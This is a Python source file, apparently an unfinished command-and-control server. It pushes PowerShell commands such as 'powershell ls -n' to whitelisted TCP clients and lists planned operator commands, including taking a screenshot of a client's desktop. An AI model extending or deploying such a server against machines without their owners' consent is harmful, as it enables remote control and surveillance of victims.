import socketserver
# Example used at https://docs.python.org/3/library/socketserver.html

import threading
# Threads is used to run multiple I/O-bound tasks simultaneously, here, requests
# https://docs.python.org/3/library/threading.html 


# Override class socketserver.BaseRequestHandler : https://docs.python.org/3/library/socketserver.html#socketserver.BaseRequestHandler
class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
    """
    It is instantiated once per connection to the server, and must
    override the handle() method to implement communication to the client.
    """

    def setup(self) :
        print(f'New client connection : {self.client_address}')
        print(f'Threads alive : {threading.active_count()}')


    def handle(self):

        if (self.client_address[0] not in WHITE_LIST) :
            print('IP not in the WhiteList')
            return
        try :
            while True : # Keep the connection Open, delete the loop when only the server will send commands 
                self.data = self.request.recv(1024).strip() # buff size 1024
                print(f'{self.client_address} > ' + self.data.decode('utf-8'))

                # send back data
                # self.request.sendall(b'powershell start brave www.google.ca') 
                self.request.sendall(b'powershell ls -n')
        except ConnectionAbortedError :
            print('Client disconnected')
    

    def finish(self) :
        print(f'Connection closed for: {self.client_address}')

# The threaded version let multiple clients connect at the same time.
# They can both communicate in a continuous Stream
class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    """This server will handle each request in a new thread."""
    # This ensures that the server can be interrupted and shut down even if there are active client connections.
    daemon_threads = True
    

def read_white_list():
    with open('white_list.txt', 'r') as file:
        whitelist = {line.strip() for line in file if line.strip()}
    return whitelist


def central_commands():
    exit = False
    list_commands_available()

    try :
        while not exit:
            print('\nWaiting for a command, exit to close the server')
            msg = input('> ')

            if msg == 'exit':
                    exit = True
                    break
            
            command = msg.split(' ')
            if command[0] == 'help':
                list_commands_available()
            elif command[0] == 'list':
                print_clients(server)

    except KeyboardInterrupt:
        print('Central commands terminated')


def list_commands_available():
    print('help : List all the commands available')
    print('list : To list clients connected to the server')
    print('send_echo [clientIP@port] [messageIn""]')
    print('get_SC [clientIP@port] : Get a ScreenShot of the client Desktop')
    # print('send_pw_command')


def print_clients(server):
    # print threads for now
    print(f'Threads : {threading.active_count()}')


if __name__ == '__main__':
    HOST, PORT = 'localhost', 5000
    WHITE_LIST = read_white_list()
    
    try :
        with ThreadedTCPServer((HOST, PORT), ThreadedTCPRequestHandler) as server : 
            print('--------------------------------------------')
            print(f'Server Hosting @ : {HOST}:{PORT}')
            print('--------------------------------------------\n')

            # Run the server in a separate thread to control it from the main thread
            server_thread = threading.Thread(target=server.serve_forever) # 'Handle one request at a time until shutdown. (CTL+C)'
            server_thread.daemon = True
            server_thread.start()

            # Listen from incoming commands from the server operator
            central_commands()

            server.shutdown()
            server.server_close()

    except KeyboardInterrupt:
        print('Server terminated')
        server.shutdown()
        server.server_close()